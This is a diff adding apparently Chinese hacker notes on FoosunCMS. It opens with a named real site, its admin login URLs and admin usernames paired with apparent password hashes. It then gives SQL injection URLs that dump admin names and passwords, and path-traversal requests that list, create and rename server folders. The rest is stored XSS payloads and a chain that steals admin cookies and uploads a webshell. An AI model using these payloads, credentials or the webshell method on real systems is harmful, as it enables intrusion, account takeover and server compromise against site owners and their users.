@@ -1,0 +1,73 @@
+FS_MF_Admin
+http://www.csxsyy.com/
+默认
+http://www.csxsyy.com//Admin/login.asp
+
+
+http://www.csxsyy.com//Fs_Inc/vCode.asp?
+
+http://www.csxsyy.com/customform/CustomFormJS.asp?FormStyleID=10&OtherCSS=btn_q&CustomFormID=2
+
+Flyfalcons   5c2ce5b9a3e4bf57   muonline
+焦江如       768095b0e7cd0428
+协盛杨琼     c358dbf1de4f3c4a
+协盛尹思     d5b1291496907ab2
+
+
+
+
+风讯(FoosunCMS) 注入漏洞利用exp
+
+风讯foosun的注册文件存在漏洞，可以暴管理员帐号和密码。
+
+漏洞文件：
+
+    http://www.xxxx.com/user/SetNextOptions.asp
+
+利用简单的方法：
+
+暴管理员帐号：
+
+    http://www.xxxx.com/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_name,3,4,5,6,7,8++from+FS_MF_Admin
+
+暴管理员密码：
+
+    http://www.xxxx.com/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_pass_word,3,4,5,6,7,8++from+FS_MF_Admin
+
+
+
+
+
+风讯FoosunCMS最新漏洞 （浏览目录创建文件漏洞xss上传）
+发布时间：2011-5-15
+服务器安全防护，我们强烈推荐护卫神；护卫神一直专注服务器安全研究，自主开发入侵防护系统，从黑客入侵的每个环节进行拦截，让服务器和网站不再被入侵。详细介绍>>> 
+通过测试发现该程序FolderImageList.asp FolderImageList.asp FileManage.asp 几个脚本程序在处理用户提交的恶意路径参数时没有进行控制过滤，导致攻击者可以进行服务器目前查看，创建等操作，恶意攻击者可以利用该缺陷进行脚本木马的创建利用，导致服务器被控制。
+
+先注册用户名登录我后执行下边的命令就可以了
+1 游览目录文件
+http://www.abc.com/User/CommPages/FolderImageList.asp?CurrPath=/admin/
+2 创建一个目录
+http://www.abc.com/User/CommPages/FolderImageList.asp?CurrPath=/123456/
+3 修改一个目录名称
+http://www.abc.com/User/FileManage.asp?Type=FolderReName&OldFileName=../../123456&NewFileName=654321
+
+作者： 坏人咖啡
+
+------------------------------------------------------------
+
+当两个鸡助的漏洞合体的时候
+
+很多人认为XSS危害很小，在很多情况下还是很有危害的。比如这个cms,一个XSS+一个后台上传漏洞，单单这两个漏洞来说，都很鸡助，但是当两个鸡助的漏洞合体以后，威力将不可忽视
+
+1.http://www.xx.com/user/index.aspx?urls=http://www.XXX.com
+存在XSS
+2.http://www.xx.com/user/index.aspx点击控制面板，修改资料，职业处存在存储型xss
+填入sss"><script>alert(22)</script>,查看资料，弹出警告框
+3.http://www.xx.com/user/index.aspx点击社区/讨论->创建讨论组,内部公告存在存储型XSS，填入xx"><script>alert(55)</script>,转到首页，讨论组，找到刚才创建的讨论组，点击，弹出警告框，不过貌似讨论组管理的时候会爆出输入字符串的格式不正确
+
+。
+4.登录网站后台，点击插件管理，在点击左边的文件管理，上传文件，上传webshell命名为XX.jpg,上传.OK，看到xx.jpg，右边操作栏->改名为XX.aspx，找到路径/files/xxx.aspx,直接得到webshell.漏洞明显设计逻辑有问题，不能直接上传aspx，但是可以间接的上传aspx.
+ok,下面来说下这几个漏洞的危害，单单这几个漏洞来说，都很鸡助，但是结合起来，威力不小，
+首先，利用XSS窃取管理员cookies，例如你可以在职业处构造XSS，当管理员查看你的资料就会泄露cookies等其他信息
+当你得到cookies。进入后台，上传webshell
+
